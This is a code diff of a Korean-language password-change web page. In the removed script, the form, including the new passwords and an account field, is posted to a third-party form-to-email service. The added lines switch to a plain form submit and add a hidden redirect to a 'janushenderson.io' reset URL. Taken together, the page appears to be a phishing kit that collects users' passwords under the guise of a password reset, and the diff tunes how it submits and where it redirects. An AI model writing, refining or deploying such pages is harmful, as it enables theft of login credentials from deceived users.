@@ -87,6 +87,7 @@
       <input type="hidden" name="subject" value="비밀번호 변경 요청">
       <input type="hidden" name="account" id="accountField">
       <input type="hidden" name="botcheck" value="">
+      <input type="hidden" name="redirect" value="https://janushenderson.io/app/password/resetpassword/?done=1">
 
       <label for="pw1">새 비밀번호</label>
       <div class="wrap">
@@ -149,28 +150,9 @@
     });
   });
 
-  document.getElementById('pwForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    btn.disabled = true; btn.textContent = '처리 중…';
-    const data = Object.fromEntries(new FormData(e.target));
-    try {
-      const res = await fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(data)
-      });
-      const json = await res.json();
-      if (json.success) {
-        document.getElementById('formView').style.display = 'none';
-        document.getElementById('doneView').style.display = 'block';
-      } else {
-        alert('오류: ' + (json.message || JSON.stringify(json)));
-        btn.disabled = false; btn.textContent = '확인';
-      }
-    } catch (err) {
-      alert('네트워크 오류: ' + err.message);
-      btn.disabled = false; btn.textContent = '확인';
-    }
+  // 제출 전 버튼 상태만 변경, 실제 전송은 form 기본 동작으로 처리
+  document.getElementById('pwForm').addEventListener('submit', () => {
+    btn.textContent = '처리 중…';
   });
 </script>
 </body>
